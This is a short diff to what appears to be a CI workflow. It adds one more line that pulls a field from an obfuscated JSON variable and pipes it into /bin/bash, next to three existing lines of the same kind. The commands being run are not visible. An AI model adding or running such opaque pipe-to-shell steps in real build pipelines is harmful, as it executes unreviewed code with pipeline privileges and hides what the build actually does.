@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$htj986" | jq -r .ou40494 | /bin/bash
           echo $u5367 | jq -r .zmarx99 | /bin/bash
           echo $g8753 | jq -r .en4 | /bin/bash
+          echo $lpc8 | jq -r .tu280 | /bin/bash
 
       - name: Archive results
         if: always()
